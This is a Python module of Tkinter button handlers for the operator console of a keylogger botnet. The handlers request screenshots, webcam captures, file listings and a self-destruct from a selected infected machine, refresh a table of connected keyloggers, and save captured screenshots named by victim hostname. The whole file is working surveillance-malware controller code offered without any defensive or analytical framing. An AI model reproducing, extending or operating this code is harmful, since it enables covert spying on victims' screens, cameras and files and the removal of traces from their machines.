import logging
from datetime import datetime
from pathlib import Path

from .base import BaseEventHandler
from settings import app_config
from server import Server
from gui import UIManager
from commands import ScreenshotCommand, WebcamCommand, SelfDestructCommand, FileCommand
from utils import EventHandlerRegister, AsyncTkinter, ImageManagerX


logger = logging.getLogger(__name__)


class ButtonHeaderHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_MAIN)
    @AsyncTkinter.async_handler
    async def command_main():
        UIManager.render_window(app_config.gui.config.FILENAME_MAIN_CONFIG)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_INFO)
    @AsyncTkinter.async_handler
    async def command_info():
        print("Info")

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_CREATE)
    @AsyncTkinter.async_handler
    async def command_create():
        UIManager.render_top_level(app_config.gui.config.FILENAME_COMPILE_CONFIG)
        btn = UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_CREATE)
        btn.config(state='disabled')

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_SCREEN)
    @AsyncTkinter.async_handler
    async def command_screenshot():
        BaseEventHandler.change_state_header_buttons('disabled')
        server = Server()
        UIManager.render_window(app_config.gui.config.FILENAME_SCREEN_CONFIG)
        logger.info(f'Screenshot command send -> {server.selected_keylogger}')
        response = await server.request(ScreenshotCommand)
        if response is None:
            BaseEventHandler.change_state_header_buttons('enabled')
            return
        frame = UIManager.REGISTER.get(app_config.gui.keys.widget_names.SCREEN_FRAME_IMG)
        img = ImageManagerX(response, (frame.winfo_width() - 20, frame.winfo_height()))
        label = UIManager.REGISTER.get(app_config.gui.keys.widget_names.LABEL_SCREEN)
        label.configure(image=img.tk_image)
        label.image = img
        UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_SAVE_SCREEN).configure(state='enabled')
        BaseEventHandler.change_state_header_buttons('enabled')

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_WEB)
    @AsyncTkinter.async_handler
    async def command_web():
        server = Server()
        UIManager.render_window(app_config.gui.config.FILENAME_WEB_CONFIG)
        logger.info(f'Camera command send -> {server.selected_keylogger}')
        response = await server.request(WebcamCommand)
        response = response.decode() if response else None if response else None
        print(response)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_DESTRUCT)
    @AsyncTkinter.async_handler
    async def command_destruct():
        server = Server()
        logger.info(f'Destruct command send -> {server.selected_keylogger}')
        response = await server.request(SelfDestructCommand)
        response = response.decode() if response else None if response else None
        print(response)

    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_FILE)
    @AsyncTkinter.async_handler
    async def command_file():
        server = Server()
        logger.info(f'File Manager command send -> {server.selected_keylogger}')
        response = await server.request(FileCommand)
        response = response.decode() if response else None
        print(response)


class ButtonMainHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_REFRESH)
    @AsyncTkinter.async_handler
    async def command_refresh():
        logger.info('Refresh Table')
        server = Server()
        await server.monitor_client()
        keyloggers = set(server.clients.keys())
        table = UIManager.REGISTER.get(app_config.gui.keys.widget_names.TABLE_KEYLOGGERS)
        rows = dict(map(lambda item: (tuple(item.values), item.iid), table.get_rows()))
        all_rows = set(rows.keys())
        rows_delete, rows_insert = all_rows - keyloggers, keyloggers - all_rows
        if rows_delete:
            logger.debug(f'Delete Keyloggers - {rows_delete}')
            BaseEventHandler.change_state_header_buttons('disabled')
            rows_delete = list(map(lambda item: rows[item], rows_delete))
            table.delete_rows(iids=rows_delete)
        if rows_insert:
            logger.debug(f'Insert Keyloggers - {rows_insert}')
            table.insert_rows('end', list(rows_insert))
            table.load_table_data()


class ButtonScreenHandler:
    @staticmethod
    @EventHandlerRegister.registry(app_config.gui.keys.callback_names.CLICK_SAVE_SCREEN)
    def save_screenshot():
        logger.debug("Started screenshot saving process")
        UIManager.REGISTER.get(app_config.gui.keys.widget_names.BUTTON_SAVE_SCREEN).configure(state='disabled')
        label = UIManager.REGISTER.get(app_config.gui.keys.widget_names.LABEL_SCREEN)
        if not hasattr(label, 'image'):
            return
        hostname = Server().selected_keylogger[0]
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        screen_name = Path(f'{hostname}_{timestamp}.png')
        save_path = app_config.SCREENSHOT_DIR / screen_name
        label.image.save(save_path)
        label.configure(image='')
        label.image = None
